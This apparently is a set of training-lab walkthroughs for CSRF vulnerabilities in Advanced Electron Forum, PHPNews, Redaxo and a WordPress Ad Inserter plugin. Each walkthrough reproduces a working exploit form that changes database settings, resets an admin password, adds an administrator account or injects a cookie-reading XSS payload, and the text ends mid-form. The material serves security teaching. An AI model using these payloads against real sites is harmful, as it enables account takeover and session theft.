This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
 
Step 2: ​Search on google “advanced electron forum exploit” and look for publicly available 
exploits. 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/39261  
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the login portal and log into the web 
application 
 
URL: ​http://nxkibhlaxp4mpr6dhj7xq8aza.mumbaix.attackdefenselabs.com/index.php?act=login 
 
 
Credentials: 
 
●
Username: ​admin 
●
Password​: password1 
 
Admin Dashboard: 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
HTML Script: 
 
<form id="DOOM" accept-charset="ISO-8859-1" 
action="http://nxkibhlaxp4mpr6dhj7xq8aza.mumbaix.attackdefenselabs.com/index.php?act=admin&adact
=conpan&seadact=mysqlset" 
method="post" name="mysqlsetform"> 
<input type="hidden" name="server" value="hyp3rlinx.altervista.org" /> 
<input type="hidden" name="user" value="hyp3rlinx" /> 
<input type="hidden" name="password" value="DESTROYED" /> 
<input type="hidden" name="database" value="AEF" /> 
<input type="hidden" name="dbprefix" value="aef_" /> 
<script>document.getElementById('DOOM').submit()</script> 
</form> 
 
Save the HTML script as csrf.html 
 
 
 
 
Step 5: ​Open the HTML script in the same browser session. 
 
 
 
The exploit was unsuccessful as the csrf request was not processed because of login pop-up 
 
Step 6: ​Login with the credentials and open the csrf.html again. 
 
 
 
The CSRF was successful and as a result the db credentials were changed.  
 
References:  
 
1.
Advanced Electron Forum (​http://www.anelectron.com/​)  
2.
Advanced Electron Forum 1.0.9 - Cross-Site Request Forgery 
(​https://www.exploit-db.com/exploits/39261/​)  
 
 
 
Name 
PHPNews 
URL 
https://www.attackdefense.com/challengedetails?cid=324  
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
Step 2: ​Search on google “php news csrf exploit” and look for publicly available exploits. 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/40557/  
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal. 
 
URL: ​http://vipkn51z1nnwmpvd6jlxk5xcg.mumbaix.attackdefenselabs.com/ 
 
 
 
 
 
 
 
 
 
Credentials: 
 
●
Username: ​admin 
●
Password​: password 
 
Admin Dashboard: 
 
 
Step 4: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
HTML Script: 
 
<html> 
  <!— CSRF PoC —> 
  <body> 
    <form 
action="http://vipkn51z1nnwmpvd6jlxk5xcg.mumbaix.attackdefenselabs.com/index.php?action=modifyne
wsposter3" method="POST"> 
      <input type="hidden" name="id" value="1" /> 
      <input type="hidden" name="newusername" value="admin" /> 
      <input type="hidden" name="username" value="admin" /> 
      <input type="hidden" name="password" value="hacked@123" /> 
      <input type="hidden" name="password2" value="hacked@123" /> 
      <input type="hidden" name="email" value="hacker@hacker.xyz" /> 
      <input type="hidden" name="language" value="en_GB" /> 
      <input type="hidden" name="access" value="admin" /> 
      <input type="submit" value="Submit request" /> 
    </form> 
    <script> 
      document.forms[0].submit(); 
    </script> 
  </body> 
</html> 
 
Save the HTML script as csrf.html 
 
 
 
Step 5: ​Open the HTML script in the same browser session. 
 
 
 
 
 
 
 
 
 
The HTML page will be redirected to the website after execution. 
 
Step 6: ​Logout and login again with new credentials. 
 
●
Username:​ admin 
●
Password:​ hacked@123 
 
 
 
 
The CSRF was successful and as a result the password was changed.  
 
 
 
 
References:  
 
1.
PHP NEWS (​https://sourceforge.net/projects/newsphp​)  
2.
PHP NEWS 1.3.0 - Cross-Site Request Forgery (Add Admin) 
(​https://www.exploit-db.com/exploits/40557​)  
 
 
 
Name 
Redaxo 5.2.0 
URL 
https://www.attackdefense.com/challengedetails?cid=442 
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “redaxo csrf exploit” and look for publicly available exploits. 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/40708 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal. 
 
URL: ​http://vay29utzt507oatrr6ski8pdn.mumbaix.attackdefenselabs.com/redaxo/redaxo 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Credentials: 
 
●
Username: ​admin 
●
Password​: password 
 
Admin Dashboard: 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
HTML Script: 
 
<html> 
  <!-- CSRF PoC  --> 
  <body> 
    <form name="form0" 
action="http://vay29utzt507oatrr6ski8pdn.mumbaix.attackdefenselabs.com/redaxo/redaxo/index.php?pag
e=users/users" method="POST"> 
      <input type="hidden" name="userlogin" value="Attacker" /> //  username 
      <input type="hidden" name="username" value="Attacker" /> 
      <input type="hidden" name="userdesc" value="Atacker" /> 
      <input type="hidden" name="useremail" value="hhhhh@hhh.com" />// email 
      <input type="hidden" name="useradmin" value="1" /> 
      <input type="hidden" name="userstatus" value="1" /> 
      <input type="hidden" name="userperm_be_sprache" value="en_gb" /> 
      <input type="hidden" name="userpsw" value="7c4a8d09ca3762af61e59520943dc26494f8941b" /> 
//123456 
      <input type="hidden" name="function" value="1" /> 
      <input type="hidden" name="FUNC_ADD" value="1" /> 
      <input type="hidden" name="save" value="1" /> 
      <input type="hidden" name="javascript" value="1" /> 
      <input type="submit" name="submit_pass" value="Save" /> 
    </form> 
  </body> 
</html> 
 
Save the HTML script as csrf.html 
 
 
 
Step 5: ​Open the HTML script in the same browser session. 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
New user Attacker was added 
 
Step 6: ​Logout and login again with new credentials. 
 
●
Username:​ attacker 
●
Password:​ 123456 
 
 
 
The CSRF was successful and as a result a new user was added.  
 
References:  
 
1.
Redaxo (​http://www.redaxo.org​)  
2.
Redaxo 5.2.0 - Cross-Site Request Forgery  (​https://www.exploit-db.com/exploits/40708​)  
 
 
 
Name 
WordPress Ad Inserter 
URL 
https://www.attackdefense.com/challengedetails?cid=443 
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “wordpress ad inserter exploit” and look for publicly available exploits. 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/36961 
 
 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal and log into the 
web application. 
 
URL: ​h3yybawp44m9d9d89qt6gabnd.mumbaix.attackdefenselabs.com/wp-login.php 
 
 
 
Credentials:  
 
●
Username: ​pentester 
●
Password​: password1 
 
Admin Dashboard: 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Copy the HTML script provided at exploit db link and update the URL in the request. 
Also modify the value of “ad1_name” input field in order to trigger XSS. 
 
HTML Script: 
 
<html> 
  <!-- CSRF PoC - generated by Burp Suite Professional --> 
  <body> 
    <form 
action="http://h3yybawp44m9d9d89qt6gabnd.mumbaix.attackdefenselabs.com/wp-admin/options-general
.php?page=ad-inserter.php" method="POST"> 
      <input type="hidden" name="ad_save" value="Save All Settings" /> 
      <input type="hidden" name="ad1_name" value="<img src=a onerror='prompt(document.cookie)'/>" /> 
      <input type="hidden" name="ad1_process_php" value="0" /> 
      <input type="hidden" name="ad1_data" value="" /> 
      <input type="hidden" name="ad1_displayType" value="None" /> 
      <input type="hidden" name="ad1_display_for_users" value="all" /> 
      <input type="hidden" name="ad1_display_for_devices" value="all" /> 
      <input type="hidden" name="ad1_floatType" value="None" /> 
      <input type="hidden" name="ad1_custom_css" value="" /> 
      <input type="hidden" name="ad1_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad1_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad1_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad1_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad1_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad1_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad1_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad1_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad1_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad1_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad1_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad1_after_day" value="0" /> 
      <input type="hidden" name="ad1_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad1_block_user" value="" /> 
      <input type="hidden" name="ad1_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad1_block_cat" value="" /> 
      <input type="hidden" name="ad1_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad1_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad1_paragraph_text" value="" /> 
      <input type="hidden" name="ad1_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad1_directionType" value="From Top" /> 
      <input type="hidden" name="ad1_excerptNumber" value="0" /> 
      <input type="hidden" name="ad1_enable_manual" value="0" /> 
      <input type="hidden" name="ad1_enable_php_call" value="0" /> 
      <input type="hidden" name="ad2_name" value="Block 2" /> 
      <input type="hidden" name="ad2_process_php" value="0" /> 
      <input type="hidden" name="ad2_data" value="" /> 
      <input type="hidden" name="ad2_displayType" value="None" /> 
      <input type="hidden" name="ad2_display_for_users" value="all" /> 
      <input type="hidden" name="ad2_display_for_devices" value="all" /> 
      <input type="hidden" name="ad2_floatType" value="None" /> 
      <input type="hidden" name="ad2_custom_css" value="" /> 
      <input type="hidden" name="ad2_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad2_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad2_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad2_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad2_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad2_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad2_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad2_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad2_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad2_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad2_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad2_after_day" value="0" /> 
      <input type="hidden" name="ad2_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad2_block_user" value="" /> 
      <input type="hidden" name="ad2_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad2_block_cat" value="" /> 
      <input type="hidden" name="ad2_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad2_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad2_paragraph_text" value="" /> 
      <input type="hidden" name="ad2_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad2_directionType" value="From Top" /> 
      <input type="hidden" name="ad2_excerptNumber" value="0" /> 
      <input type="hidden" name="ad2_enable_manual" value="0" /> 
      <input type="hidden" name="ad2_enable_php_call" value="0" /> 
      <input type="hidden" name="ad3_name" value="Block 3" /> 
      <input type="hidden" name="ad3_process_php" value="0" /> 
      <input type="hidden" name="ad3_data" value="" /> 
      <input type="hidden" name="ad3_displayType" value="None" /> 
      <input type="hidden" name="ad3_display_for_users" value="all" /> 
      <input type="hidden" name="ad3_display_for_devices" value="all" /> 
      <input type="hidden" name="ad3_floatType" value="None" /> 
      <input type="hidden" name="ad3_custom_css" value="" /> 
      <input type="hidden" name="ad3_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad3_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad3_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad3_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad3_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad3_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad3_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad3_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad3_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad3_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad3_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad3_after_day" value="0" /> 
      <input type="hidden" name="ad3_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad3_block_user" value="" /> 
      <input type="hidden" name="ad3_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad3_block_cat" value="" /> 
      <input type="hidden" name="ad3_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad3_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad3_paragraph_text" value="" /> 
      <input type="hidden" name="ad3_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad3_directionType" value="From Top" /> 
      <input type="hidden" name="ad3_excerptNumber" value="0" /> 
      <input type="hidden" name="ad3_enable_manual" value="0" /> 
      <input type="hidden" name="ad3_enable_php_call" value="0" /> 
      <input type="hidden" name="ad4_name" value="Block 4" /> 
      <input type="hidden" name="ad4_process_php" value="0" /> 
      <input type="hidden" name="ad4_data" value="" /> 
      <input type="hidden" name="ad4_displayType" value="None" /> 
      <input type="hidden" name="ad4_display_for_users" value="all" /> 
      <input type="hidden" name="ad4_display_for_devices" value="all" /> 
      <input type="hidden" name="ad4_floatType" value="None" /> 
      <input type="hidden" name="ad4_custom_css" value="" /> 
      <input type="hidden" name="ad4_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad4_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad4_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad4_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad4_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad4_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad4_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad4_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad4_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad4_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad4_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad4_after_day" value="0" /> 
      <input type="hidden" name="ad4_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad4_block_user" value="" /> 
      <input type="hidden" name="ad4_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad4_block_cat" value="" /> 
      <input type="hidden" name="ad4_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad4_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad4_paragraph_text" value="" /> 
      <input type="hidden" name="ad4_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad4_directionType" value="From Top" /> 
      <input type="hidden" name="ad4_excerptNumber" value="0" /> 
      <input type="hidden" name="ad4_enable_manual" value="0" /> 
      <input type="hidden" name="ad4_enable_php_call" value="0" /> 
      <input type="hidden" name="ad5_name" value="Block 5" /> 
      <input type="hidden" name="ad5_process_php" value="0" /> 
      <input type="hidden" name="ad5_data" value="" /> 
      <input type="hidden" name="ad5_displayType" value="None" /> 
      <input type="hidden" name="ad5_display_for_users" value="all" /> 
      <input type="hidden" name="ad5_display_for_devices" value="all" /> 
      <input type="hidden" name="ad5_floatType" value="None" /> 
      <input type="hidden" name="ad5_custom_css" value="" /> 
      <input type="hidden" name="ad5_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad5_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad5_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad5_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad5_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad5_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad5_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad5_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad5_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad5_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad5_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad5_after_day" value="0" /> 
      <input type="hidden" name="ad5_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad5_block_user" value="" /> 
      <input type="hidden" name="ad5_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad5_block_cat" value="" /> 
      <input type="hidden" name="ad5_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad5_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad5_paragraph_text" value="" /> 
      <input type="hidden" name="ad5_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad5_directionType" value="From Top" /> 
      <input type="hidden" name="ad5_excerptNumber" value="0" /> 
      <input type="hidden" name="ad5_enable_manual" value="0" /> 
      <input type="hidden" name="ad5_enable_php_call" value="0" /> 
      <input type="hidden" name="ad6_name" value="Block 6" /> 
      <input type="hidden" name="ad6_process_php" value="0" /> 
      <input type="hidden" name="ad6_data" value="" /> 
      <input type="hidden" name="ad6_displayType" value="None" /> 
      <input type="hidden" name="ad6_display_for_users" value="all" /> 
      <input type="hidden" name="ad6_display_for_devices" value="all" /> 
      <input type="hidden" name="ad6_floatType" value="None" /> 
      <input type="hidden" name="ad6_custom_css" value="" /> 
      <input type="hidden" name="ad6_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad6_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad6_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad6_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad6_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad6_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad6_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad6_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad6_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad6_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad6_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad6_after_day" value="0" /> 
      <input type="hidden" name="ad6_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad6_block_user" value="" /> 
      <input type="hidden" name="ad6_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad6_block_cat" value="" /> 
      <input type="hidden" name="ad6_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad6_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad6_paragraph_text" value="" /> 
      <input type="hidden" name="ad6_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad6_directionType" value="From Top" /> 
      <input type="hidden" name="ad6_excerptNumber" value="0" /> 
      <input type="hidden" name="ad6_enable_manual" value="0" /> 
      <input type="hidden" name="ad6_enable_php_call" value="0" /> 
      <input type="hidden" name="ad7_name" value="Block 7" /> 
      <input type="hidden" name="ad7_process_php" value="0" /> 
      <input type="hidden" name="ad7_data" value="" /> 
      <input type="hidden" name="ad7_displayType" value="None" /> 
      <input type="hidden" name="ad7_display_for_users" value="all" /> 
      <input type="hidden" name="ad7_display_for_devices" value="all" /> 
      <input type="hidden" name="ad7_floatType" value="None" /> 
      <input type="hidden" name="ad7_custom_css" value="" /> 
      <input type="hidden" name="ad7_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad7_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad7_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad7_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad7_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad7_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad7_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad7_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad7_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad7_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad7_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad7_after_day" value="0" /> 
      <input type="hidden" name="ad7_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad7_block_user" value="" /> 
      <input type="hidden" name="ad7_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad7_block_cat" value="" /> 
      <input type="hidden" name="ad7_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad7_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad7_paragraph_text" value="" /> 
      <input type="hidden" name="ad7_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad7_directionType" value="From Top" /> 
      <input type="hidden" name="ad7_excerptNumber" value="0" /> 
      <input type="hidden" name="ad7_enable_manual" value="0" /> 
      <input type="hidden" name="ad7_enable_php_call" value="0" /> 
      <input type="hidden" name="ad8_name" value="Block 8" /> 
      <input type="hidden" name="ad8_process_php" value="0" /> 
      <input type="hidden" name="ad8_data" value="" /> 
      <input type="hidden" name="ad8_displayType" value="None" /> 
      <input type="hidden" name="ad8_display_for_users" value="all" /> 
      <input type="hidden" name="ad8_display_for_devices" value="all" /> 
      <input type="hidden" name="ad8_floatType" value="None" /> 
      <input type="hidden" name="ad8_custom_css" value="" /> 
      <input type="hidden" name="ad8_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad8_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad8_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad8_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad8_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad8_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad8_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad8_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad8_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad8_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad8_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad8_after_day" value="0" /> 
      <input type="hidden" name="ad8_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad8_block_user" value="" /> 
      <input type="hidden" name="ad8_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad8_block_cat" value="" /> 
      <input type="hidden" name="ad8_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad8_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad8_paragraph_text" value="" /> 
      <input type="hidden" name="ad8_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad8_directionType" value="From Top" /> 
      <input type="hidden" name="ad8_excerptNumber" value="0" /> 
      <input type="hidden" name="ad8_enable_manual" value="0" /> 
      <input type="hidden" name="ad8_enable_php_call" value="0" /> 
      <input type="hidden" name="ad9_name" value="Block 9" /> 
      <input type="hidden" name="ad9_process_php" value="0" /> 
      <input type="hidden" name="ad9_data" value="" /> 
      <input type="hidden" name="ad9_displayType" value="None" /> 
      <input type="hidden" name="ad9_display_for_users" value="all" /> 
      <input type="hidden" name="ad9_display_for_devices" value="all" /> 
      <input type="hidden" name="ad9_floatType" value="None" /> 
      <input type="hidden" name="ad9_custom_css" value="" /> 
      <input type="hidden" name="ad9_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad9_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad9_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad9_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad9_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad9_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad9_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad9_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad9_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad9_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad9_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad9_after_day" value="0" /> 
      <input type="hidden" name="ad9_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad9_block_user" value="" /> 
      <input type="hidden" name="ad9_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad9_block_cat" value="" /> 
      <input type="hidden" name="ad9_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad9_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad9_paragraph_text" value="" /> 
      <input type="hidden" name="ad9_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad9_directionType" value="From Top" /> 
      <input type="hidden" name="ad9_excerptNumber" value="0" /> 
      <input type="hidden" name="ad9_enable_manual" value="0" /> 
      <input type="hidden" name="ad9_enable_php_call" value="0" /> 
      <input type="hidden" name="ad10_name" value="Block 10" /> 
      <input type="hidden" name="ad10_process_php" value="0" /> 
      <input type="hidden" name="ad10_data" value="" /> 
      <input type="hidden" name="ad10_displayType" value="None" /> 
      <input type="hidden" name="ad10_display_for_users" value="all" /> 
      <input type="hidden" name="ad10_display_for_devices" value="all" /> 
      <input type="hidden" name="ad10_floatType" value="None" /> 
      <input type="hidden" name="ad10_custom_css" value="" /> 
      <input type="hidden" name="ad10_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad10_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad10_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad10_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad10_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad10_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad10_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad10_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad10_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad10_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad10_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad10_after_day" value="0" /> 
      <input type="hidden" name="ad10_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad10_block_user" value="" /> 
      <input type="hidden" name="ad10_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad10_block_cat" value="" /> 
      <input type="hidden" name="ad10_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad10_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad10_paragraph_text" value="" /> 
      <input type="hidden" name="ad10_paragraphNumber" value="0" /> 
      <input type="hidden" name="ad10_directionType" value="From Top" /> 
      <input type="hidden" name="ad10_excerptNumber" value="0" /> 
      <input type="hidden" name="ad10_enable_manual" value="0" /> 
      <input type="hidden" name="ad10_enable_php_call" value="0" /> 
      <input type="hidden" name="ad11_name" value="Block 11" /> 
      <input type="hidden" name="ad11_process_php" value="0" /> 
      <input type="hidden" name="ad11_data" value="" /> 
      <input type="hidden" name="ad11_displayType" value="None" /> 
      <input type="hidden" name="ad11_display_for_users" value="all" /> 
      <input type="hidden" name="ad11_display_for_devices" value="all" /> 
      <input type="hidden" name="ad11_floatType" value="None" /> 
      <input type="hidden" name="ad11_custom_css" value="" /> 
      <input type="hidden" name="ad11_widget_settings_post" value="0" /> 
      <input type="hidden" name="ad11_widget_settings_post" value="1" /> 
      <input type="hidden" name="ad11_widget_settings_page" value="0" /> 
      <input type="hidden" name="ad11_widget_settings_home" value="0" /> 
      <input type="hidden" name="ad11_widget_settings_home" value="1" /> 
      <input type="hidden" name="ad11_widget_settings_category" value="0" /> 
      <input type="hidden" name="ad11_widget_settings_category" value="1" /> 
      <input type="hidden" name="ad11_widget_settings_search" value="0" /> 
      <input type="hidden" name="ad11_widget_settings_search" value="1" /> 
      <input type="hidden" name="ad11_widget_settings_archive" value="0" /> 
      <input type="hidden" name="ad11_widget_settings_archive" value="1" /> 
      <input type="hidden" name="ad11_after_day" value="0" /> 
      <input type="hidden" name="ad11_general_tag" value="gadgets" /> 
      <input type="hidden" name="ad11_block_user" value="" /> 
      <input type="hidden" name="ad11_domain_list_type" value="Black List" /> 
      <input type="hidden" name="ad11_block_cat" value="" /> 
      <input type="hidden" name="ad11_block_cat_type" value="Black List" /> 
      <input type="hidden" name="ad11_minimum_paragraphs" value="0" /> 
      <input type="hidden" name="ad11_paragraph_text" value="" /> 
